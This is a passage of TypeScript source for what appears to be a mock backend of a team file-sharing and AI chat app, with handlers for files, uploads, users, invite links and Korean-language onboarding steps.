      if (!n || n.type !== 'file' || this.access(page, c.user) === 'none') fail('not_found', 404)
      if (!this.htmlPdf) fail('unavailable', 503, undefined, undefined, { reason: 'unavailable' })
      this.htmlPdfCalls.push({ path: page, how: 'download' })
      const bytes = enc.encode(MOCK_PDF)
      return new Response(bytes as unknown as BodyInit, { headers: { 'content-type': 'application/pdf', 'content-length': String(bytes.byteLength), 'content-disposition': `attachment; filename*=UTF-8''${encodeURIComponent(page.split('/').pop()!.replace(/\.[^./]+$/, '') + '.pdf')}`, 'x-content-type-options': 'nosniff' } })
    },
    upload: (c) => {
      const folder: string = c.body.folder
      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403)
      const name = c.body.name ?? c.file!.name
      let path = folder ? `${folder}/${name}` : name
      if (this.files.has(path)) path = path.replace(/(\.[^.]+)?$/, (ext: string) => ` (2)${ext}`)
      return (async () => {
        const data = new Uint8Array(await c.file!.arrayBuffer())
        await this.uploadAnswer()
        this.putFile(path, data)
        this.publish({ type: 'files.changed', data: { changes: [{ path, action: 'create', by: { id: c.user.id, name: c.user.name }, turnId: null }] } })
        return { status: 201, body: this.entry(path, this.files.get(path)!, c.user) }
      })()
    },
    mkdir: (c) => {
      if (this.files.has(c.body.path)) fail('conflict', 409)
      this.files.set(c.body.path, { type: 'folder', mtime: now() })
      return { status: 201, body: this.entry(c.body.path, this.files.get(c.body.path)!, c.user) }
    },
    move: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from) ?? fail('not_found', 404)
      if (this.access(from, c.user) !== 'write') fail('forbidden', 403)
      let to: string = c.body.to
      if (to === from) return { entry: this.entry(from, n, c.user) }
      if (this.files.has(to)) {
        if (c.body.onExists !== 'rename') fail('conflict', 409)
        to = this.freePath(to)
      }
      if (this.access(parentOf(to), c.user) !== 'write') fail('forbidden', 403)
      // like server/src/team-files/service.ts: into the mover's own users/<id>/ while other people can read it now
      const own = `users/${c.user.id}/`
      if (to.startsWith(own) && !from.startsWith(own) && !c.body.confirm) {
        const lost = this.users.filter((u) => u.id !== c.user.id && this.access(from, u) !== 'none' && this.access(to, u) === 'none').length
        if (lost > 0) throw new Fail('conflict', 409, undefined, undefined, { reason: 'audience_narrowed', lostViewers: lost })
      }
      for (const [p, v] of [...this.files.entries()]) {
        if (p === from || p.startsWith(from + '/')) {
          this.files.delete(p)
          this.files.set(to + p.slice(from.length), v)
        }
      }
      return { entry: this.entry(to, n, c.user) }
    },
    // share by copying (server/src/team-files/service.ts copy): files only; dryRun counts who would see it in addition
    copy: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from)
      if (!n || this.access(from, c.user) === 'none') return fail('not_found', 404)
      if (n.type !== 'file') fail('validation', 400, 'a folder cannot be copied')
      let to: string = c.body.to
      const parent = parentOf(to)
      if (parent && this.files.get(parent)?.type !== 'folder') fail('not_found', 404)
      if (this.access(parent, c.user) !== 'write') fail('forbidden', 403)
      const viewersAdded = this.users.filter((u) => u.id !== c.user.id && this.access(to, u) !== 'none' && this.access(from, u) === 'none').length
      if (c.body.dryRun) return { viewersAdded }
      if (this.files.has(to)) {
        if (c.body.onExists === 'fail') fail('conflict', 409)
        if (c.body.onExists === 'rename') to = this.freePath(to)
      }
      this.putFile(to, n.data!)
      return { path: to, sha256: sha256Hex(n.data!) }
    },
    remove: (c) => {
      const n = this.files.get(c.query.path!) ?? fail('not_found', 404)
      this.files.delete(c.query.path!)
      const item = { id: uuidv7(), originalPath: c.query.path!, size: n.data?.byteLength ?? 0, deletedBy: { id: c.user.id, name: c.user.name }, turnId: null, deletedAt: now(), purgeAt: new Date(Date.now() + this.settings.trashRetentionDays * 86400_000).toISOString(), node: n }
      this.trash.push(item)
      return { trashId: item.id, purgeAt: item.purgeAt }
    },
    history: (c) => {
      const f = this.files.get(c.query.path!)
      const items = this.versions.filter((v) => v.path === c.query.path)
      const current = f?.data ? { version: Math.max(0, ...items.map((v) => v.version)) + 1, sha256: sha256Hex(f.data), size: f.data.byteLength, author: { id: 'olga', name: 'Olga' }, turnId: null, at: f.mtime } : null
      const events = current ? [{ id: 1, at: f!.mtime, kind: 'edited' as const, by: current.author, turnId: null, path: c.query.path!, from: null, size: current.size }] : []
      return { path: c.query.path, items, currentSha256: current?.sha256 ?? null, canRestore: this.access(c.query.path!, c.user) === 'write', current, events }
    },
    versionDownload: (c) => {
      const v = this.versions.find((x) => x.id === c.params.versionId) ?? fail('not_found', 404)
      return new Response(`version ${v.version}`, { headers: { 'content-disposition': 'attachment' } })
    },
    restoreVersion: (c) => {
      const v = this.versions.find((x) => x.id === c.body.versionId) ?? fail('not_found', 404)
      if (this.access(v.path, c.user) !== 'write') fail('forbidden', 403)
      this.versions.push({ ...v, id: uuidv7(), version: this.versions.filter((x) => x.path === v.path).length + 1, kind: 'restore', createdAt: now(), author: { id: c.user.id, name: c.user.name }, savedBy: null, savedTurnId: null })
      return { path: v.path, conflict: false, entry: this.entry(v.path, this.files.get(v.path)!, c.user) }
    },
    trash: () => ({ items: this.trash.map(({ node: _n, ...t }) => t), nextCursor: null }),
    restoreTrash: (c) => {
      const t = this.trash.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.trash = this.trash.filter((x) => x.id !== t.id)
      this.files.set(t.originalPath, t.node)
      return { entry: this.entry(t.originalPath, t.node, c.user) }
    },
    attachTeamFile: (c) => {
      const path: string = c.body.path
      const n = this.files.get(path)
      if (!n || n.type !== 'file' || this.access(path, c.user) === 'none') fail('not_found', 404)
      const name = path.slice(path.lastIndexOf('/') + 1)
      const mime = mimeOf(path) ?? 'application/octet-stream'
      const a: Attachment & { data: Uint8Array } = {
        id: uuidv7(), name, path, size: n!.data!.byteLength, mime, kind: mime.startsWith('image/') ? 'image' : 'text', source: 'team',
        sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), data: n!.data!,
      }
      this.attachments.set(a.id, a)
      return { status: 201, body: (({ data: _d, ...rest }) => rest)(a) }
    },
    findFiles: (c) => {
      const q = String(c.query.q ?? '').toLowerCase()
      const base = String(c.query.path ?? '')
      const items = [...this.files.entries()]
        // like the server (policy/authorize.ts visiblePath): download-only files are not search hits
        .filter(([p, n]) => n.type === 'file' && !this.downloadOnly.has(p) && (!base || p.startsWith(base + '/')) && p.slice(p.lastIndexOf('/') + 1).toLowerCase().includes(q) && this.access(p, c.user) !== 'none' && !(p.startsWith('users/') && !p.startsWith(`users/${c.user.id}/`)))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 50)), truncated: false }
    },
    recentFiles: (c) => {
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && !this.downloadOnly.has(p) && this.access(p, c.user) !== 'none' && !p.startsWith('users/'))
        .sort((a, b) => b[1].mtime.localeCompare(a[1].mtime))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 20)), truncated: false }
    },
    uploadAttachment: async (c) => {
      const data = new Uint8Array(await c.file!.arrayBuffer())
      await this.uploadAnswer()
      return { status: 201, body: this.makeAttachment(c.body.chatId, c.body.name ?? c.file!.name, data, c.file!.type, c.user) }
    },
    attachmentThumbnail: (c) => {
      const a = this.attachments.get(c.params.id!) ?? fail('not_found', 404)
      return new Response(a.data as unknown as BodyInit, { headers: { 'content-type': a.mime } })
    },
    createUploadSession: (c) => {
      if (c.body.target.kind === 'transcribe') this.transcribeGate(c.body.target.chatId)
      const s: UploadSession & { chunks: Map<number, Uint8Array> } = { id: uuidv7(), target: c.body.target, size: c.body.size, sha256: c.body.sha256, chunkSize: UPLOAD_CHUNK_SIZE, chunkCount: Math.ceil(c.body.size / UPLOAD_CHUNK_SIZE), received: [], expiresAt: new Date(Date.now() + 86400_000).toISOString(), chunks: new Map() }
      this.uploads.set(s.id, s)
      const { chunks: _x, ...out } = s
      return { status: 201, body: out }
    },
    uploadChunk: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      s.chunks.set(Number(c.params.n), new Uint8Array(await c.req.arrayBuffer()))
      s.received = [...s.chunks.keys()].sort((a, b) => a - b)
      return { received: s.received }
    },
    getUploadSession: (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const { chunks: _x, ...out } = s
      return out
    },
    completeUploadSession: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      await this.uploadAnswer()
      const all = new Uint8Array(s.size)
      for (const [n, d] of s.chunks) all.set(d, n * s.chunkSize)
      const hash = new Bun.CryptoHasher('sha256').update(all).digest('hex')
      if (hash !== s.sha256) fail('conflict', 409, 'sha256 mismatch')
      this.uploads.delete(s.id)
      if (s.target.kind === 'path') {
        this.putFile(s.target.path, all)
        return { kind: 'path', entry: this.entry(s.target.path, this.files.get(s.target.path)!, c.user) }
      }
      if (s.target.kind === 'attachment') return { kind: 'attachment', attachment: this.makeAttachment(s.target.chatId, s.target.name, all, 'application/octet-stream', c.user) }
      return { kind: 'transcribe', jobId: this.transcribeJob(c.user) }
    },
    cancelUploadSession: (c) => {
      this.uploads.delete(c.params.id!)
      return undefined
    },
    listChatArtifacts: (c) => {
      const keys = [...new Set(this.artifacts.filter((a) => a.chatId === c.params.id).map((a) => a.key))]
      return { items: keys.map((key) => ({ key, versions: this.artifacts.filter((a) => a.chatId === c.params.id && a.key === key).sort((a, b) => b.version - a.version).map(({ content, ...s }) => ({ ...s, size: content.length })) })) }
    },
    getArtifact: (c) => this.artifacts.find((a) => a.id === c.params.id) ?? fail('not_found', 404),
    // a promo video's state (server/src/promo-video/render.ts): the mock never makes the MP4, so no button
    getPromoVideo: (c) => {
      const a = this.artifacts.find((x) => x.id === c.params.id && x.key === PROMO_ARTIFACT_KEY) ?? fail('not_found', 404)
      return { artifactId: a.id, chatId: a.chatId, title: a.title, style: PROMO_STYLES[0], duration: 18.5, mp4: { available: false, state: 'none' as const, seconds: null, bytes: null } }
    },
    // an intro deck's info (server/src/intro-deck/): the mock never builds the files, so neither download is offered
    getIntroDeck: (c) => {
      const a = this.artifacts.find((x) => x.id === c.params.id && x.key === DECK_ARTIFACT_KEY) ?? fail('not_found', 404)
      return { artifactId: a.id, chatId: a.chatId, title: a.title ?? '', theme: 'paper' as const, slides: 1, pptx: false, pdf: false }
    },
    // intro decks being built (round 2): the chat's builds, newest first, and a finished slide's small picture
    listDeckBuilds: (c) => {
      if (!this.chats.some((x) => x.id === c.query.chatId)) fail('not_found', 404)
      return { builds: this.deckBuilds.filter((b) => b.chatId === c.query.chatId).reverse().slice(0, 10) }
    },
    deckBuildSlide: (c) => {
      const b = this.deckBuilds.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const i = Number(c.params.n)
      if (!b.thumbs || b.slides[i]?.status !== 'done') fail('not_found', 404)
      return new Response(slidePng(i) as unknown as BodyInit, { headers: { 'content-type': 'image/png', 'cache-control': 'private, max-age=3600' } })
    },
    getJob: (c) => this.jobs.get(c.params.id!) ?? fail('not_found', 404),
    cancelJob: (c) => {
      const j = this.jobs.get(c.params.id!) ?? fail('not_found', 404)
      j.status = 'canceled'
      return j
    },
    transcribe: (c) => {
      this.transcribeGate(c.body.chatId)
      return { status: 202, body: { jobId: this.transcribeJob(c.user) } }
    },
    pollCalls: () => ({ calls: [] }),
    postResult: () => undefined,

    listUsers: () => ({ items: this.users }),
    createUser: (c) => {
      checkTemp(c.body.temporaryPassword)
      if (this.users.some((x) => x.username.toLowerCase() === c.body.username.toLowerCase())) fail('conflict', 409, '이미 쓰고 있는 아이디예요.')
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: c.body.role, groupIds: c.body.groupIds ?? [], mustChangePassword: true, localeChoice: c.body.locale ?? null, email: c.body.email ?? null }, c.body.temporaryPassword ?? 'tiger4271')
      return { status: 201, body: { user: u, temporaryPassword: c.body.temporaryPassword ?? 'tiger4271', expiresAt: tempUntil(), signInUrl: 'https://team.example.com' } }
    },
    updateUser: (c) => {
      const { locale, ...rest } = c.body
      const u = Object.assign(this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(rest).filter(([, v]) => v !== undefined)))
      if (locale !== undefined) u.localeChoice = locale
      this.syncLocales()
      return u
    },
    deleteUser: (c) => {
      const target = this.users.find((u) => u.id === c.params.id) ?? fail('not_found', 404)
      const me = c.user
      // as the server: an admin removes a member only, with their password again
      if (me.role === 'admin') {
        if (target.role !== 'member') fail('forbidden', 403)
        if (c.body?.password !== this.passwords.get(me.username)) fail('forbidden', 403, 'wrong password')
      }
      this.users = this.users.filter((u) => u.id !== c.params.id)
      return undefined
    },
    resetPassword: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      checkTemp(c.body?.temporaryPassword)
      const temp = c.body?.temporaryPassword ?? 'maple0385'
      this.passwords.set(u!.username, temp)
      u!.mustChangePassword = true
      this.resets.set(u!.id, { by: { id: c.user.id, name: c.user.name }, at: now() })
      return { temporaryPassword: temp, expiresAt: tempUntil(), signInUrl: 'https://team.example.com' }
    },
    // like server/src/admin/users.ts transferOwnership: the password again, then the old owner becomes an admin
    transferOwnership: (c) => {
      if (this.passwords.get(c.user.username) !== c.body.password) fail('forbidden', 403, '비밀번호가 맞지 않아요. 다시 입력해 주세요.')
      const u = this.users.find((x) => x.id === c.body.userId && x.status === 'active') ?? fail('not_found', 404)
      if (u.id === c.user.id) fail('forbidden', 403)
      for (const x of this.users) if (x.role === 'owner') x.role = 'admin'
      u.role = 'owner'
      return { ok: true as const }
    },
    createResetLink: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      if (u.role === 'owner') fail('forbidden', 403)
      const token = 'rst' + uuidv7().replace(/-/g, '')
      return { token, url: `/reset-password/${token}`, expiresAt: new Date(Date.now() + 24 * 3600_000).toISOString() }
    },
    listInvites: () => ({ items: this.invites.map(({ token: _t, ...i }) => i) }),
    createInvite: (c) => {
      const token = 'inv' + uuidv7().replace(/-/g, '')
      const i = { id: uuidv7(), role: c.body.role ?? 'member', groupIds: c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInHours ?? 72) * 3600_000).toISOString(), usedAt: null, usedBy: null, token }
      this.invites.push(i)
      const { token: _t, ...invite } = i
      return { status: 201, body: { invite, token, url: `/invite/${token}` } }
    },
    revokeInvite: (c) => {
      this.invites = this.invites.filter((i) => i.id !== c.params.id)
      return undefined
    },
    // the team invite link, like server/src/auth/team-links.ts (no plan: no seat limit, 20 uses by default)
    getTeamLink: (c) => this.teamLinkResponse(c.req, c.user),
    createTeamLink: (c) => {
      if (this.teamLink) this.revokedTeamLinks.add(this.teamLink.token)
      const token = 'tl' + uuidv7().replace(/-/g, '')
      this.teamLink = { id: uuidv7(), token, groupIds: c.body.groupIds ?? [], skillPath: c.body.skillPath ?? null, starter: c.body.skillPath ? (c.body.starter ?? null) : null, maxUses: c.body.maxUses ?? 20, uses: 0, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInDays ?? 14) * 86_400_000).toISOString() }
      return { status: 201, body: this.teamLinkResponse(c.req, c.user) }
    },
    // like the server: the open link's skill and starter change and groups are added; its address stays
    updateTeamLink: (c) => {
      const l = this.teamLink
      if (!l || l.uses >= l.maxUses) fail('not_found', 404)
      const b = c.body as { skillPath?: string | null; starter?: TeamLinkStarter | null; addGroupIds?: string[] }
      if ((b.addGroupIds ?? []).some((g) => !this.groups.some((x) => x.id === g))) fail('validation', 400, '없는 그룹이 들어 있어요.', { 'body.addGroupIds': 'unknown group' })
      if (b.skillPath !== undefined) l!.skillPath = b.skillPath
      if (b.starter !== undefined) l!.starter = b.starter
      if (!l!.skillPath) l!.starter = null
      l!.groupIds = [...new Set([...l!.groupIds, ...(b.addGroupIds ?? [])])]
      return this.teamLinkResponse(c.req, c.user)
    },
    revokeTeamLink: () => {
      if (!this.teamLink) fail('not_found', 404)
      this.revokedTeamLinks.add(this.teamLink!.token)
      this.teamLink = null
      return undefined
    },
    teamLinkInfo: (c) => {
      const l = this.teamLink?.token === c.body.token ? this.teamLink : null
      if (!l && this.revokedTeamLinks.has(c.body.token)) return { teamName: this.settings.teamName, valid: false, problem: 'revoked', expiresAt: now(), skillName: null }
      if (!l) fail('not_found', 404)
      const problem = l!.uses >= l!.maxUses ? 'used_up' : null
      const skill = l!.skillPath ? this.teamLinkSkill(l!.skillPath) : null
      return { teamName: this.settings.teamName, valid: !problem, problem, expiresAt: l!.expiresAt, skillName: skill?.name ?? null, skillTitle: skill?.title ?? null }
    },
    joinTeamLink: (c) => {
      const l = this.teamLink?.token === c.body.token ? this.teamLink : null
      if (!l && !this.revokedTeamLinks.has(c.body.token)) fail('not_found', 404)
      if (!l) fail('gone', 410, '더 이상 쓰지 않는 초대 링크예요. 링크를 보낸 분께 새 링크를 부탁해 주세요.')
      if (l!.uses >= l!.maxUses) fail('gone', 410, '이 링크로 들어올 수 있는 인원이 다 찼어요. 링크를 보낸 분께 새 링크를 부탁해 주세요.')
      if (this.users.some((u) => u.username.toLowerCase() === c.body.username.toLowerCase())) fail('conflict', 409, '이미 쓰고 있는 아이디예요.', { 'body.username': 'taken' })
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: 'member', groupIds: l!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      l!.uses++
      const next = l!.skillPath && this.teamLinkSkillName(l!.skillPath) ? `/skills?run=${encodeURIComponent(l!.skillPath)}` : null
      // the starter as the new member may use it: the skill they can open, the files that exist and they can read
      const skill = l!.skillPath ? this.skillsFor(u).find((x) => x.path === l!.skillPath && !x.personal) : undefined
      const files = (l!.starter?.files ?? []).filter((f) => this.files.get(f)?.type === 'file' && this.access(f, u) !== 'none').map((f) => ({ path: f, name: f.slice(f.lastIndexOf('/') + 1) }))
      const by = this.users.find((x) => x.id === l!.createdBy.id)?.name ?? null
      // who made the link's skill (S): the line above its form (every skill lands on its form, one without fields too: W5)
      const maker = l!.skillPath ? this.users.find((x) => x.id === this.skillMakers.get(l!.skillPath!))?.name ?? null : null
      const starter = l!.starter && skill && files.length ? { kind: l!.starter.kind, skill: { path: skill.path, name: skill.name, title: skill.title ?? skill.name }, files, by } : null
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, ''), next, starter, skillBy: maker } }
    },
    // onboarding A, B, D: the scripted AI answers everyone, there is no hosting trial credit and no company profile yet
    // (the composer's "no AI" line, Admin › AI connections and the skill forms ask for these on their own)
    getAiAccess: (c) => ({ usable: true, action: c.user.role === 'owner' ? 'connect_team' : 'ask_owner', requested: false }),
    requestAiAccess: () => fail('forbidden', 403, '이미 AI를 쓸 수 있어요.'),
    trialCredit: () => ({ credit: null }),
    getCompanyProfile: () => ({ profile: this.companyProfile }),
    saveCompanyProfile: (c) => (this.companyProfile = { ...(c.body as import('@mycel/shared/api').CompanyProfileInput), updatedAt: now() }),
    // the website reading (server/src/onboarding/draft.ts, short): running for its first read, then a draft made from the
    // team's name; like the server, its chat is not in the chat list (server/src/chat/internal-chats.ts)
    startProfileDraft: (c) => {
      const b = c.body as import('@mycel/shared/api').StartProfileDraft
      const website = b.website ? normalizeWebsite(b.website) ?? '' : ''
      const id = uuidv7()
      this.profileDrafts.set(id, { userId: c.user.id, website, reads: 0 })
      return { status: 201, body: { chatId: id, website, site: website ? new URL(website).host.replace(/^www\./, '') : null } }
    },
    getProfileDraft: (c) => {
      const d = this.profileDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      const base = { website: d!.website, error: null, steps: [], writing: false, assets: { images: 0, logo: false, colors: ['#1b6e3a'] } }
      if (++d!.reads < 2) return { ...base, status: 'running', draft: null, writing: true }
      const team = this.settings.teamName
      return { ...base, status: 'done', draft: { website: d!.website, name: team, oneLine: `${team}는 조용한 책상 선풍기를 만들어요`, products: '책상 선풍기', audience: '작은 사무실', tone: ['친근한'], avoid: '',
        sources: d!.website ? [{ field: 'oneLine', url: d!.website, excerpt: '조용한 책상 선풍기' }] : [] } }
    },
    // the welcome steps (server/src/onboarding/welcome.ts, the same rules in short): one record, the pack once
    getWelcome: () => ({ progress: this.welcome }),
    updateWelcome: (c) => {
      const at = now()
      const p: WelcomeProgress = this.welcome ?? { startedAt: at, updatedAt: at, teamType: null, steps: { profile: null, result: null, skills: null, files: null, invite: null }, pack: null, resultChatId: null, inviteShownAt: null, site: null, dismissedAt: null, finishedAt: null }
      const b = c.body as import('@mycel/shared/api').WelcomeUpdate
      if (b.resultChatId !== undefined) {
        if (!this.chats.some((x) => x.id === b.resultChatId)) fail('not_found', 404)
        // the deck's chat counts once it holds a message (server: welcome.ts)
        if (this.messages.some((m) => m.chatId === b.resultChatId)) p.resultChatId = b.resultChatId
      }
      if (b.teamType) p.teamType = b.teamType
      if (b.step) {
        // 회사 소개 put off on an old row whose profile was saved without a deck: the deck is put off (server: welcome.ts)
        if (b.step.id === 'profile' && b.step.state === 'skipped' && p.steps.profile === 'done' && !p.resultChatId && (p.steps.result ?? null) === null) p.steps.result = 'skipped'
        if (b.step.state === 'done' || p.steps[b.step.id] !== 'done') p.steps[b.step.id] = b.step.state
        if (b.step.id === 'skills') delete p.skillsLater
      }
      // 내 스킬 put off on a phone (docs/DECISIONS.md "SK"); the invite's landing skill among the shared ones
      if (b.skillsLater && !b.step && p.steps.skills !== 'done') { p.steps.skills = 'skipped'; p.skillsLater = true }
      if (b.landing !== undefined) {
        if (!p.shared?.skills.some((x) => x.path === b.landing)) fail('validation', 400)
        p.shared = { ...p.shared!, landing: b.landing }
      }
      if (b.inviteShown && !p.inviteShownAt) p.inviteShownAt = at
      if (b.doneShown && !p.doneShownAt) p.doneShownAt = at
      if (b.site) p.site = b.site
      if (b.dismissed !== undefined) p.dismissedAt = b.dismissed ? (p.dismissedAt ?? at) : null
      // "자료 없이 해 볼게요" without the marketing pack: the result and the invite put off, the steps finished
      if (b.finish) {
        if (p.steps.result !== 'done') p.steps.result = 'skipped'
        p.steps.invite ??= 'skipped'
        p.finishedAt ??= at
      }
      this.welcome = this.welcomeSaved(p, at)
      return { progress: this.welcome }
    },
    installWelcomePack: (c) => {
      const at = now()
      const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
      if (p.pack) return { progress: p, install: null, outcome: 'already' }
      for (const d of ['skills/marketing', 'skills/marketing/ad-copy']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
      this.putFile(WELCOME_RESULT_SKILL, '---\nname: ad-copy\ndescription: 광고 문구 — 광고 문구 3안\nmetadata:\n  title: 광고 문구\n---\n# 광고 문구\n')
      p.pack = { id: 'marketing', at, skillPath: WELCOME_RESULT_SKILL }
      return { progress: p, install: { pack: 'marketing', locale: this.settings.defaultLocale, skills: [{ name: 'ad-copy', path: WELCOME_RESULT_SKILL, status: 'created' }], folders: [] }, outcome: 'installed' }
    },
    // every team's start (server/src/onboarding/welcome.ts): the general pack once, and the team's group (named after
    // the team, the owner in it) with groups/<name>/, its meeting notes folder and its brand folder, once
    setupWelcomeTeam: (c) => {
      const at = now()
      const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
      let install = null
      if (!p.general) {
        const skills = [['meeting-tasks', GENERAL_TASKS_SKILL, '할 일 정리'], ['doc-brief', GENERAL_BRIEF_SKILL, '핵심 정리'], ['card-news', GENERAL_CARDNEWS_SKILL, '카드뉴스'], ['promo-video', GENERAL_PROMO_SKILL, '홍보 영상'], ['intro-deck', GENERAL_DECK_SKILL, '회사 소개서']] as const
        for (const [name, path, title] of skills) {
          for (const d of ['skills/general', `skills/general/${name}`]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
          if (!this.files.has(path)) this.putFile(path, path === GENERAL_CARDNEWS_SKILL ? CARDNEWS_TEXT : path === GENERAL_PROMO_SKILL ? PROMO_TEXT : path === GENERAL_DECK_SKILL ? DECK_TEXT : `---\nname: ${name}\ndescription: ${title}\nmetadata:\n  title: ${title}\n---\n# ${title}\n`)
        }
        p.general = { at, tasksPath: GENERAL_TASKS_SKILL, briefPath: GENERAL_BRIEF_SKILL, cardNewsPath: GENERAL_CARDNEWS_SKILL, promoVideoPath: GENERAL_PROMO_SKILL, introDeckPath: GENERAL_DECK_SKILL }
        install = { pack: 'general' as const, locale: this.settings.defaultLocale, skills: skills.map(([name, path]) => ({ name, path, status: 'created' as const })), folders: [] }
      }
      if (!p.teamGroup) {
        // like server/src/onboarding/welcome.ts: a group these steps did not make is never taken over ("Acme 2")
        const team = this.settings.teamName
        const taken = (n: string) => this.groups.some((x) => x.name.toLowerCase() === n.toLowerCase())
        const name = !taken(team) ? team : [2, 3, 4, 5, 6, 7, 8, 9].map((n) => `${team} ${n}`).find((n) => !taken(n)) ?? `${team} ${Date.now()}`
        const g = (this.handlers.createGroup!({ ...c, body: { name, memberIds: [c.user.id] } }) as { body: Group }).body
        const folder = `groups/${g.name}`
        const notesFolder = `${folder}/${NOTES_FOLDER[this.settings.defaultLocale as keyof typeof NOTES_FOLDER] ?? NOTES_FOLDER.en}`
        for (const d of ['groups', folder, notesFolder]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
        p.teamGroup = { id: g.id, name: g.name, folder, notesFolder }
      }
      // the brand folder (docs/DECISIONS.md "N"), also for a group recorded before it
      if (!p.teamGroup.brandFolder) {
        const brandFolder = `${p.teamGroup.folder}/${this.localized(PACK_FOLDERS.brand)}`
        this.files.set(brandFolder, this.files.get(brandFolder) ?? { type: 'folder', mtime: at })
        p.teamGroup = { ...p.teamGroup, brandFolder }
      }
      p.updatedAt = at
      return { progress: p, install, outcome: install ? 'installed' : 'already' }
    },
    // the first result, the company intro deck (server/src/onboarding/welcome-result.ts, short): the owner's files in
    // the brand folder, or a 회사 소개.md written there; a new chat of the owner's; the intro deck skill once for an
    // older row.
    // The mock collects no website images (images: []).
    startFirstResult: (c) => {
      const at = now()
      const p = this.welcome
      // once per team (docs/DECISIONS.md "W5"): a deck that started answers 409 deck_started before anything else; a
      // chat made whose message never went is handed out again
      const deckId = p?.resultChatId ?? this.deckChat
      const had = deckId ? this.chats.find((x) => x.id === deckId && !x.deletedAt) : undefined
      if (had && this.messages.some((m) => m.chatId === had.id)) fail('conflict', 409, '회사 소개서는 이미 만들기 시작했어요.', undefined, { reason: 'deck_started' })
      // the team's start when it is missing (the server's own setupWelcomeTeam), as for "저장하고 계속" without files
      if (p && (!p.general || !p.teamGroup?.brandFolder)) this.handlers.setupWelcomeTeam!({ ...c, body: {} })
      const g = p?.teamGroup
      if (!p || !p.general || !g?.brandFolder) fail('conflict', 409, '팀 폴더가 아직 없어요. 시작 설정을 다시 열어 주세요.')
      const files = (c.body as import('@mycel/shared/api').StartFirstResult).files
      for (const f of files) if (this.files.get(f)?.type !== 'file' || !f.startsWith(g!.brandFolder! + '/')) fail('not_found', 404)
      if (!p!.general!.introDeckPath) {
        for (const d of ['skills/general', 'skills/general/intro-deck']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
        if (!this.files.has(GENERAL_DECK_SKILL)) this.putFile(GENERAL_DECK_SKILL, DECK_TEXT)
        p!.general = { ...p!.general!, introDeckPath: GENERAL_DECK_SKILL }
      }
      const imagesFolder = `${g!.brandFolder}/${this.localized(BRAND_IMAGES_FOLDER)}`
      this.files.set(imagesFolder, this.files.get(imagesFolder) ?? { type: 'folder', mtime: at })
      let intro: string | null = null
      if (!files.length) {
        intro = `${g!.brandFolder}/회사 소개.md`
        this.putFile(intro, `# 회사 소개\n\n${this.settings.teamName}${p!.site ? ` · ${p!.site}` : ''}\n`)
      }
      const chat = had ?? (this.handlers.createChat!({ ...c, body: { projectId: null, title: '우리 회사 소개서' } }) as { body: Chat }).body
      // kept for the deck; `resultChatId` once its message is in (the page records it after the send)
      this.deckChat = chat.id
      p!.updatedAt = at
      return { status: 201, body: { chatId: chat.id, title: chat.title, skillPath: p!.general!.introDeckPath!, files: intro ? [intro] : files, intro, imagesFolder, images: [] } }
    },
    // the one suggestion under a result (server/src/onboarding/suggestions.ts): none unless a test sets one
    // (/__test/result-suggestion); closing one keeps it closed
    // a team skill from the lead's answer (server/src/onboarding/skill-draft.ts, short): a draft chat of the caller,
    // running for its first read, then a card made from the source answer's files (meeting notes: "주간회의 할 일", the
    // notes folder and "the latest", the choice 내 할 일 / 사람별); sharing writes the skill as the caller
    startSkillDraft: (c) => {
      // (the mock's chats carry no owner: every chat is the signed-in person's)
      if (!this.chats.some((x) => x.id === c.body.chatId)) fail('not_found', 404)
      const had = [...this.skillDrafts].find(([, d]) => d.sourceChatId === c.body.chatId && d.userId === c.user.id && !d.saved)
      if (had) return { status: 201, body: { draftChatId: had[0] } }
      const id = uuidv7()
      this.skillDrafts.set(id, { userId: c.user.id, sourceChatId: c.body.chatId, reads: 0, saved: null })
      return { status: 201, body: { draftChatId: id } }
    },
    getSkillDraft: (c) => {
      const d = this.skillDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      const saved = d!.saved ? { path: d!.saved, name: d!.saved.split('/').at(-2)!, title: this.skillsFor(c.user).find((x) => x.path === d!.saved)?.title ?? '' } : null
      if (++d!.reads < 2) return { status: 'running', draft: null, problem: null, saved }
      return { status: 'done', draft: this.skillCard(d!.sourceChatId), problem: null, saved }
    },
    saveSkillDraft: (c) => {
      const d = this.skillDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      if (d!.saved) return { path: d!.saved, name: d!.saved.split('/').at(-2)!, title: c.body.title }
